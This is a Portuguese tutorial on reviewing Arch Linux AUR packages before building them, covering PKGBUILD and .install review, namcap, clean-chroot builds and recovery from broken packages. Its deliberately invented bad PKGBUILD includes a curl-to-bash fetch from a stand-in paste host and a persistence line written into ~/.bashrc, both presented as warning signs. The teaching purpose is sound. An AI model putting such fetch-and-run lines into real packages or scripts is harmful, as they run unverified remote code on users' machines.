AUR com Segurança

No AUR, ninguém revisa as receitas antes de você. Isso não quer dizer que o AUR seja perigoso para quem toma cuidado: quer dizer que você é o revisor. Esta aula é a lista do que olhar, com que ferramentas, e o que fazer quando um pacote do AUR quebra ou desaparece.

Você vai aprender
  • O que olhar na página do pacote antes de baixar.
  • O que procurar no PKGBUILD e no script .install, com exemplos reais e um exemplo ruim.
  • Usar o namcap e entender os avisos.
  • O que é compilar num chroot limpo (devtools).
  • O que fazer quando um pacote do AUR quebra, fica abandonado ou some.

Onde está o risco

Um pacote do AUR passa por dois momentos, e os dois executam código de outra pessoa:

MomentoO que rodaCom que poder
makepkgO PKGBUILD inteiro (é Bash): prepare(), build(), check(), package() e qualquer comando solto no arquivoO seu usuário: pode ler e apagar a sua pasta pessoal, suas chaves SSH, seus documentos
pacman -UCopia os arquivos do pacote e roda o script .install, se houverroot: pode mexer em qualquer coisa do sistema

Por isso a revisão tem que acontecer antes do makepkg. Depois que ele rodou, o código já rodou.

1. Antes de baixar: a página

Abra https://aur.archlinux.org/packages/NOME (os campos estão explicados em O que é o AUR) e responda:

  • O nome é o que você procurava? Desconfie de nomes que imitam programas conhecidos com um "extra": -fix, -patch, -patched, -free, -premium. Os pacotes maliciosos de 2025 tinham nomes assim (firefox-patch-bin, librewolf-fix-bin).
  • Idade e votos: "First Submitted" de ontem, 0 votos, e um programa famoso? Procure o pacote "oficial" desse programa no AUR: geralmente é antigo e tem centenas de votos.
  • Upstream URL: aponta para o site ou o GitHub do projeto de verdade?
  • Mantenedor e "Last Packager": mudaram há pouco? Pacote órfão adotado por uma conta nova merece leitura cuidadosa da última mudança (o caso do acroread em 2018).
  • Comentários: alguém reclamou de algo estranho? O pacote está quebrado (como o paru-bin)?
  • "View Changes": o histórico do git no navegador. Veja o que a última versão mudou.

2. Ler o PKGBUILD

Você não precisa entender cada linha de um build() complicado. Precisa achar o que não deveria estar ali. A tabela:

OndeNormalSuspeito
sourceSite ou GitHub/GitLab oficial do projeto, por https; arquivos pequenos (patches) no próprio repositório da receitaDomínios que não têm nada a ver com o projeto, endereços IP, encurtadores de link, pastebins, http:// sem assinatura
sha256sumsUma soma para cada arquivo; SKIP só para fontes do git (git+https://…) e para assinaturas .sigSKIP num .tar.gz baixado da internet (o arquivo pode mudar sem ninguém perceber)
Funções./configure, make, cargo build, install -Dm… para dentro de "$pkgdir"curl … | sh, wget, git clone dentro das funções (baixar coisas que não passaram pela verificação de source)
PrivilégiosNenhum: o makepkg roda como vocêsudo, su, pkexec dentro do PKGBUILD
CaminhosTudo em "$srcdir" e "$pkgdir"Escrever em $HOME, ~/.bashrc, /etc, /usr direto (sem $pkgdir)
TextoCódigo legívelbase64 -d, eval, longas sequências de letras sem sentido (código escondido)
install=Mensagens, atualizar cachesBaixar coisas, criar serviços do systemd que não têm a ver com o programa (veja abaixo)

Como seria uma receita ruim (ilustrativo)

O exemplo abaixo foi inventado para esta aula; não é um pacote real. Veja quantos sinais ele tem:

pkgname=firefox-turbo-bin          # nome que imita um programa famoso
pkgver=150.0
pkgrel=1
arch=('x86_64')
source=("http://203.0.113.7/ff.tar.gz")   # IP, sem https, sem relação com a Mozilla
sha256sums=('SKIP')                       # "não confira o download"
install=firefox-turbo.install

package() {
  install -Dm755 firefox "$pkgdir/usr/bin/firefox"
  curl -s https://paste.example/x | bash  # baixa e roda outro script, sem verificação
  echo 'curl -s https://paste.example/y | bash' >> ~/.bashrc   # mexe na sua pasta pessoal
}

Cada comentário é um motivo para fechar a página. O curl … | bash é o pior: o script baixado não passa pelas somas, pode ser trocado a qualquer momento no servidor e roda com o seu usuário.

3. O script .install

Se o PKGBUILD tem uma linha install=algo.install, esse arquivo entra no pacote e o pacman o executa como root na instalação, atualização ou remoção. Ele define funções com nomes fixos:

FunçãoQuando roda
pre_install / post_installAntes / depois de instalar pela primeira vez
pre_upgrade / post_upgradeAntes / depois de atualizar (recebem a versão nova e a antiga)
pre_remove / post_removeAntes / depois de remover

Pacotes oficiais também têm .install. O pacman guarda uma cópia de cada um; o do GRUB, na VM, é um bom exemplo do que é normal: mensagens e uma pequena correção de arquivo:

$ pacman -Qi grub | grep -i script
Script de instalação : Sim
$ cat /var/lib/pacman/local/grub-2:2.16-1/install
#!/bin/sh

post_upgrade() {
  # We used to package /boot/grub/grub.cfg, but there is no reason to.
  # Remove the file from package, but move real file back in place.
  if [ ! -f /boot/grub/grub.cfg -a -f /boot/grub/grub.cfg.pacsave ]; then
    mv /boot/grub/grub.cfg.pacsave /boot/grub/grub.cfg
  fi

  # Give a hint to update installation and configuration one after another.
  cat <<EOM
:: To use the new features provided in this GRUB update, it is recommended
   to install it to the MBR or UEFI. …
EOM
…
}

post_install() {
  cat <<EOM
:: Install your bootloader and generate configuration with:
     # grub-install ...
     # grub-mkconfig -o /boot/grub/grub.cfg
EOM
}

Suspeito num .install: download de qualquer coisa, criação de usuários ou serviços que não têm relação com o programa, mudanças em /etc/sudoers, /etc/ssh ou na configuração do pacman. Para tarefas repetitivas (atualizar cache de ícones, recarregar o systemd), o Arch prefere hooks do pacman ao .install.

4. Ao atualizar: leia as diferenças

Uma receita boa pode virar ruim numa atualização (é exatamente o que acontece quando alguém adota um pacote órfão com más intenções). Por isso, a cada atualização, leia só o que mudou:

  • À mão: git pull e depois git log -p (ou git diff HEAD@{1}), na pasta da receita. Veja makepkg.
  • No yay: responda A (todos) em Exibir diffs?, ou configure de vez com yay --save --answerdiff All.
  • No paru: a revisão aparece por padrão. Veja yay e paru.

Numa atualização normal, o diff costuma ser pequeno: pkgver e as somas mudam, às vezes uma dependência. Uma mudança de source para outro domínio, ou uma função nova cheia de comandos de rede, é o sinal para parar.

5. namcap: a revisão automática

O namcap (um anagrama de pacman) procura erros comuns de empacotamento. Ele não procura malware: procura receitas mal feitas (dependências erradas, licença mal escrita, arquivos no lugar errado). Funciona no PKGBUILD e no pacote pronto:

$ namcap PKGBUILD
PKGBUILD (downgrade) W: Missing Maintainer tag
$ echo $?
0
$ namcap downgrade-12.0.4-1-any.pkg.tar.zst
downgrade E: The SPDX license statement 'GPL' should be formatted as 'GPL-1.0-or-later' instead
downgrade W: Dependency bash detected and implicitly satisfied (programs ['bash'] needed in scripts ['usr/share/bash-completion/completions/downgrade', 'usr/share/bash-completion/completions/pacignore', 'usr/bin/downgrade', 'usr/bin/pacignore'])
downgrade W: Dependency included, but may not be needed ('pacman-contrib')
downgrade W: Dependency included, but may not be needed ('fzf')
LinhaO que quer dizer
W: Missing Maintainer tagW = aviso (warning). Falta o comentário # Maintainer: no topo.
E: The SPDX license statement 'GPL'…E = erro. A licença deveria usar o nome padrão SPDX (GPL-3.0-or-later…). Erro de forma, não de segurança.
Dependency bash detected and implicitly satisfiedOs scripts usam bash, mas a receita não lista bash em depends (funciona porque todo Arch tem bash).
Dependency included, but may not be neededO namcap não achou uso dessas dependências. Em scripts ele erra muito: o downgrade chama fzf e pacsort por nome, e o namcap não vê isso.

Repare: código de saída 0 mesmo com E:. O namcap só informa; quem decide é você. E nenhuma mensagem quer dizer "nada a apontar".

O namcap teria avisado do paru-bin

Rodando o namcap no pacote do paru-bin que a ana compilou, aparece o problema que quebrou o paru (veja yay e paru):

$ namcap paru-bin-2.1.0-1-x86_64.pkg.tar.zst
paru-bin E: Soname dependency libalpm.so specified without version number
paru-bin W: Referenced library 'libalpm.so.15' is an uninstalled dependency (needed in files ['usr/bin/paru'])     « aqui!
paru-bin W: Soname dependency included, but may not be needed ('libalpm.so')
…

A receita dizia libalpm.so>=14 (qualquer versão a partir da 14), mas o binário precisa exatamente da libalpm.so.15, e o sistema só tem a .16. Uma dependência declarada de forma "frouxa" deixou o pacman instalar um programa que não abre.

6. Compilar num chroot limpo (devtools)

Quando você roda makepkg, a compilação acontece no seu sistema: com os seus pacotes instalados e com acesso à sua pasta pessoal. Isso tem dois problemas: uma receita que esqueceu uma dependência funciona na sua máquina "por sorte"; e uma receita mal-intencionada pode ler os seus arquivos durante o build().

O pacote devtools (o mesmo que os empacotadores oficiais do Arch usam) compila dentro de um chroot limpo: uma mini instalação do Arch, só com base-devel e as dependências da receita, isolada num contêiner (systemd-nspawn). Na VM ele já está instalado:

$ pacman -Ql devtools | grep -E "bin/(extra-x86_64-build|makechrootpkg|mkarchroot|arch-nspawn|pkgctl|checkpkg)$"
devtools /usr/bin/arch-nspawn
devtools /usr/bin/checkpkg
devtools /usr/bin/extra-x86_64-build
devtools /usr/bin/makechrootpkg
devtools /usr/bin/mkarchroot
devtools /usr/bin/pkgctl
$ extra-x86_64-build -h
Usage: extra-x86_64-build [options] -- [makechrootpkg args]
    -h         This help
    -c         Recreate the chroot before building
    -r <dir>   Create chroots in this directory

Default makechrootpkg args: -c -n -C
ComandoO que faz
extra-x86_64-buildO jeito simples: cria (na primeira vez) o chroot em /var/lib/archbuild/extra-x86_64/, atualiza, compila a receita da pasta atual e deixa o pacote nela. Rode na pasta do PKGBUILD.
mkarchroot DIR/root base-develO jeito manual: cria o chroot onde você quiser
makechrootpkg -c -r DIRCompila a receita da pasta atual dentro de DIR (-c = limpa a cópia de trabalho antes)
checkpkgCompara o pacote novo com a versão anterior (arquivos e bibliotecas que mudaram)

O fluxo manual, explicado pelo próprio makechrootpkg -h:

$ makechrootpkg -h | head -14
Usage: makechrootpkg [options] -r <chrootdir> [--] [makepkg args]
 Run this script in a PKGBUILD dir to build a package inside a
 clean chroot. Arguments passed to this script after the
 end-of-options marker (--) will be passed to makepkg.

 The chroot dir consists of the following directories:
 <chrootdir>/{root, copy} but only "root" is required
 by default. The working copy will be created as needed

The chroot "root" directory must be created via the following
command:
    mkarchroot <chrootdir>/root base-devel

This script reads {SRC,SRCPKG,PKG,LOG}DEST, NPROC, MAKEFLAGS and

Na prática (ilustrativo: na VM do guia não criamos o chroot, porque ele baixa e instala um Arch mínimo inteiro, centenas de MiB):

mkdir ~/chroot
CHROOT=$HOME/chroot
mkarchroot $CHROOT/root base-devel          # uma vez: instala base-devel no chroot (pede sudo)
arch-nspawn $CHROOT/root pacman -Syu        # de vez em quando: atualiza o chroot
cd ~/aur/downgrade
makechrootpkg -c -r $CHROOT                 # compila isolado; o .pkg.tar.zst sai na pasta atual
sudo pacman -U downgrade-*.pkg.tar.zst
O que o chroot protege, e o que não

Ele isola a compilação: o build() não enxerga a sua pasta pessoal e não depende do que você tem instalado. Ele não protege a instalação: o pacote gerado e o .install ainda rodam como root quando você der pacman -U. Ler a receita continua necessário. O paru tem uma opção para usar o chroot sempre (--chroot).

Quando um pacote do AUR quebra ou some

O programa não abre: "error while loading shared libraries" 
$ paru --version
paru: error while loading shared libraries: libalpm.so.15: cannot open shared object file: No such file or directory
$ ldd /usr/bin/paru | grep "not found"
	libalpm.so.15 => not found

O que aconteceu: uma biblioteca do sistema foi atualizada (aqui, a do pacman) e o programa do AUR ainda pede a versão antiga. O pacman -Syu não recompila nada do AUR.

Como resolver:

  • Receita de fonte: recompile a mesma versão contra as bibliotecas novas, na pasta da receita: makepkg -Cfsi (no yay: yay -S --rebuild nome).
  • Receita -bin: recompilar não adianta (o binário é sempre o mesmo). Troque pela versão de fonte (aqui, paru no lugar de paru-bin) ou espere o mantenedor; marque o pacote como desatualizado e comente na página.
O pacote está marcado como desatualizado há meses

O que aconteceu: o mantenedor sumiu. O pacote continua funcionando enquanto nada no sistema mudar.

Como resolver: você pode atualizar a receita só para você: mude pkgver, rode updpkgsums e makepkg -si (veja Escrever um PKGBUILD). Se ficar órfão, você mesmo pode adotá-lo.

O pacote sumiu do AUR

Como confirmar: pacman -Qm ainda mostra o pacote instalado, mas yay -Si nome não acha. Depois procure nos oficiais: pacman -Ss nome.

Como resolver: se foi para o extra, instale de lá (sudo pacman -S nome): ele substitui o do AUR. Se foi apagado, o programa instalado continua funcionando, mas sem atualizações: procure o motivo na lista aur-requests e uma alternativa. A sua cópia da receita (em ~/aur ou ~/.cache/yay) continua com você.

O site do AUR está fora do ar

O que aconteceu: em 2025 o AUR passou semanas sofrendo ataques de negação de serviço (DDoS), e os ajudantes não conseguiam consultar nada.

Como resolver: o Arch mantém uma cópia somente-leitura das receitas no GitHub, com um branch por pacote (ilustrativo): git clone --branch NOME --single-branch https://github.com/archlinux/aur.git NOME, e daí makepkg normal. Leia a receita com o mesmo cuidado.

Atualizar o pacote quebrou o programa

Como resolver: o pacote antigo pode estar na pasta da receita (os .pkg.tar.zst de versões anteriores, se você não apagou) ou em ~/.cache/yay/nome/: sudo pacman -U nome-versão-antiga.pkg.tar.zst. Os pacotes do AUR não ficam em /var/cache/pacman/pkg nem no Arquivo do Arch. Veja Voltar um Pacote.

Resumo

  • O PKGBUILD roda com o seu usuário; o .install roda como root. Revise antes do makepkg.
  • Página: nome que imita, idade, votos, mantenedor novo, comentários.
  • Receita: source oficial e https, somas sem SKIP, nada de curl | sh, sudo ou escrita fora de $pkgdir.
  • Em cada atualização, leia o diff.
  • namcap aponta receitas mal feitas (e teria apontado o libalpm.so.15 do paru-bin).
  • Chroot limpo (devtools) isola a compilação, não a instalação.
  • Quebrou por biblioteca: recompile a receita de fonte; -bin depende do mantenedor.
